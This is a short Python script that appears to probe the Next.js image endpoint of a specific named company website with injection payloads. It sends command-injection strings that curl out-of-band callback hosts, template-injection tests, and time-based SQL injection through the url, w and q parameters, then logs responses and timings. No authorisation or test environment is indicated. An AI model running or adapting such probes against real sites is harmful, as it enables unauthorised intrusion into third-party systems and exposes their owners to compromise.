import requests, time, urllib.parse
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
H1='oobad8fa46690e0.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
H2='oob026cd244fe4f.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
IMG='https://www.infinitycapital.bh/_next/image'
def hit(u,w='640',q='75'):
    qs=urllib.parse.urlencode({'url':u,'w':w,'q':q})
    t=time.time()
    r=requests.get(IMG+'?'+qs,headers={'User-Agent':UA},timeout=40)
    return r.status_code,len(r.content),round(time.time()-t,1),r.content[:110]
payloads=[
 ("cmdi-1",";curl http://"+H1+"/cmdi;"),
 ("cmdi-2","$(curl http://"+H1+"/cmdi2)"),
 ("cmdi-3","`curl http://"+H1+"/cmdi3`"),
 ("cmdi-4","http://"+H1+"/cmdi4.png"),
 ("ssti-1","${7*7}"),
 ("ssti-2","{{7*7}}"),
 ("sqli-1","' OR SLEEP(8)-- "),
 ("sqli-2","1; SELECT pg_sleep(8);--"),
 ("sqli-3","1 AND 1=1"),
 ("sqli-4","1 AND 1=2"),
]
for n,u in payloads:
    try: print("  %-8s %s"%(n,hit(u)),flush=True)
    except Exception as e: print("  %-8s ERR %s"%(n,e),flush=True)
    time.sleep(1)
print("\n== w= and q= as injection carriers (the other params of the open cell) ==",flush=True)
for p in ['w','q']:
    for v in ["640 AND SLEEP(8)","640' OR '1'='1","75; curl http://"+H2+"/w","640 AND 1=1","640 AND 1=2"]:
        try:
            qs=urllib.parse.urlencode({'url':'https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg',p:v})
            if p!='w': qs+='&w=640'
            if p!='q': qs+='&q=75'
            t=time.time(); r=requests.get(IMG+'?'+qs,headers={'User-Agent':UA},timeout=40)
            print("  %s=%-28s %s len=%d %.1fs %r"%(p,v[:28],r.status_code,len(r.content),time.time()-t,r.content[:80]),flush=True)
        except Exception as e: print("  %s ERR %s"%(p,e),flush=True)
        time.sleep(1)
